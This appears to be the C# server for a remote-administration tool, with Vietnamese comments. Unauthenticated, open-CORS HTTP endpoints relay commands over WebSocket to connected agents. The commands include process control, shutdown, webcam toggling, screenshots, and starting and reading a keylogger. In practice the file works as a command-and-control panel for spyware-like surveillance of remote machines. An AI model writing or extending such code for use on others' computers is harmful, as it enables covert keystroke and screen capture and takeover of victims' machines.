using System.Net.WebSockets;
using System.Text;
using System.Collections.Concurrent;

var builder = WebApplication.CreateBuilder(args);

// Add services
builder.Services.AddSingleton<AgentManager>();
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin().AllowAnyMethod().AllowAnyHeader();
    });
});

var app = builder.Build();
var agentManager = app.Services.GetRequiredService<AgentManager>();

app.UseCors();

// --- ĐÃ SỬA: BỎ COMMENT DÒNG NÀY ---
app.UseWebSockets();
// ------------------------------------

app.UseDefaultFiles();
app.UseStaticFiles();

// --- ĐÃ SỬA: BỎ COMMENT KHỐI NÀY ĐỂ MỞ CỔNG CHO AGENT ---
app.Map("/ws/agent", async context =>
{
    if (context.WebSockets.IsWebSocketRequest)
    {
        var webSocket = await context.WebSockets.AcceptWebSocketAsync();
        // Lưu ý: context.Connection.RemoteIpAddress có thể null nếu chạy localhost, thêm check null
        await agentManager.HandleAgentConnection(webSocket, context.Connection.RemoteIpAddress?.ToString() ?? "Unknown");
    }
    else
    {
        context.Response.StatusCode = 400;
    }
});
// ---------------------------------------------------------

// API Endpoints
app.MapGet("/api/agents", () =>
{
    var agents = agentManager.GetConnectedAgents();
    return Results.Ok(agents);
});

app.MapGet("/api/agents/{agentId}/apps", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "LIST_APPS");
    return Results.Ok(result);
});

app.MapGet("/api/agents/{agentId}/processes", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "LIST_PROCESSES");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/start", async (string agentId, StartRequest request) =>
{
    var result = await agentManager.SendCommand(agentId, $"START_PROCESS|{request.ProcessName}");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/kill", async (string agentId, KillRequest request) =>
{
    var result = await agentManager.SendCommand(agentId, $"KILL_PROCESS|{request.ProcessId}");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/shutdown", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "SHUTDOWN");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/restart", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "RESTART");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/disable-webcam", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "DISABLE_WEBCAM");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/enable-webcam", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "ENABLE_WEBCAM");
    return Results.Ok(result);
});

app.MapGet("/api/agents/{agentId}/screenshot", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "SCREENSHOT");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/start-keylogger", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "START_KEYLOGGER");
    return Results.Ok(result);
});

app.MapPost("/api/agents/{agentId}/stop-keylogger", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "STOP_KEYLOGGER");
    return Results.Ok(result);
});

app.MapGet("/api/agents/{agentId}/keylog", async (string agentId) =>
{
    var result = await agentManager.SendCommand(agentId, "GET_KEYLOG");
    return Results.Ok(result);
});

Console.WriteLine("===========================================");
Console.WriteLine("       WEB SERVER - Điều khiển từ xa       ");
Console.WriteLine("===========================================");
Console.WriteLine();
Console.WriteLine("Web Interface: http://localhost:5000");
Console.WriteLine("WebSocket Agent: ws://localhost:5000/ws/agent");
Console.WriteLine();

app.Run("http://0.0.0.0:5000");

// Request models
record StartRequest(string ProcessName);
record KillRequest(int ProcessId);

// Agent Manager class
public class AgentManager
{
    private readonly ConcurrentDictionary<string, AgentConnection> _agents = new();

    public async Task HandleAgentConnection(WebSocket webSocket, string ipAddress)
    {
        var agentId = Guid.NewGuid().ToString("N")[..8];
        var agent = new AgentConnection
        {
            Id = agentId,
            WebSocket = webSocket,
            IPAddress = ipAddress,
            ConnectedAt = DateTime.Now,
            ResponseWaiter = new ConcurrentDictionary<string, TaskCompletionSource<string>>()
        };

        _agents[agentId] = agent;
        Console.WriteLine($"Agent kết nối: {agentId} từ {ipAddress}");

        // --- SỬA ĐOẠN NÀY ĐỂ NHẬN DỮ LIỆU LỚN ---
        var buffer = new byte[1024 * 4]; // Buffer 4KB
        try
        {
            while (webSocket.State == WebSocketState.Open)
            {
                // Dùng MemoryStream để gom các mảnh dữ liệu lại
                using (var ms = new MemoryStream())
                {
                    WebSocketReceiveResult result;
                    do
                    {
                        result = await webSocket.ReceiveAsync(new ArraySegment<byte>(buffer), CancellationToken.None);
                        ms.Write(buffer, 0, result.Count);
                    } while (!result.EndOfMessage); // Lặp cho đến khi nhận hết tin nhắn

                    if (result.MessageType == WebSocketMessageType.Close)
                    {
                        break;
                    }

                    // Giải mã toàn bộ tin nhắn đã gom đủ
                    var message = Encoding.UTF8.GetString(ms.ToArray());

                    // Xử lý phản hồi
                    if (agent.CurrentCommandId != null && agent.ResponseWaiter.TryGetValue(agent.CurrentCommandId, out var tcs))
                    {
                        tcs.TrySetResult(message);
                        agent.CurrentCommandId = null;
                    }
                }
            }
        }
        // ------------------------------------------
        catch (Exception ex)
        {
            Console.WriteLine($"Agent {agentId} lỗi: {ex.Message}");
        }
        finally
        {
            RemoveAgent(agentId);
        }
    }

    private void RemoveAgent(string agentId)
    {
        if (_agents.TryRemove(agentId, out var agent))
        {
            Console.WriteLine($"Agent ngắt kết nối: {agentId}");
            try
            {
                agent.WebSocket.CloseAsync(WebSocketCloseStatus.NormalClosure, "Closed", CancellationToken.None);
            }
            catch { }
        }
    }

    public List<object> GetConnectedAgents()
    {
        return _agents.Values.Select(a => new
        {
            a.Id,
            a.IPAddress,
            a.ConnectedAt,
            IsConnected = a.WebSocket.State == WebSocketState.Open
        }).ToList<object>();
    }

    public async Task<object> SendCommand(string agentId, string command)
    {
        if (!_agents.TryGetValue(agentId, out var agent))
        {
            return new { Success = false, Message = "Agent không tồn tại" };
        }

        if (agent.WebSocket.State != WebSocketState.Open)
        {
            RemoveAgent(agentId);
            return new { Success = false, Message = "Agent ngắt kết nối" };
        }

        try
        {
            var commandId = Guid.NewGuid().ToString("N")[..8];
            var tcs = new TaskCompletionSource<string>();
            agent.ResponseWaiter[commandId] = tcs;
            agent.CurrentCommandId = commandId;

            // Send command
            var bytes = Encoding.UTF8.GetBytes(command);
            await agent.WebSocket.SendAsync(new ArraySegment<byte>(bytes), WebSocketMessageType.Text, true, CancellationToken.None);

            // Wait for response with timeout (10 seconds)
            var timeoutTask = Task.Delay(10000);
            var completedTask = await Task.WhenAny(tcs.Task, timeoutTask);

            agent.ResponseWaiter.TryRemove(commandId, out _);

            if (completedTask == timeoutTask)
            {
                return new { Success = false, Message = "Timeout" };
            }

            var response = await tcs.Task;
            var parts = response.Split('|', 2);
            var type = parts[0];
            var data = parts.Length > 1 ? parts[1] : "";

            return new { Success = type != "ERROR", Type = type, Data = data };
        }
        catch (Exception ex)
        {
            RemoveAgent(agentId);
            return new { Success = false, Message = ex.Message };
        }
    }
}

public class AgentConnection
{
    public string Id { get; set; } = "";
    public WebSocket WebSocket { get; set; } = null!;
    public string IPAddress { get; set; } = "";
    public DateTime ConnectedAt { get; set; }
    public ConcurrentDictionary<string, TaskCompletionSource<string>> ResponseWaiter { get; set; } = new();
    public string? CurrentCommandId { get; set; }
}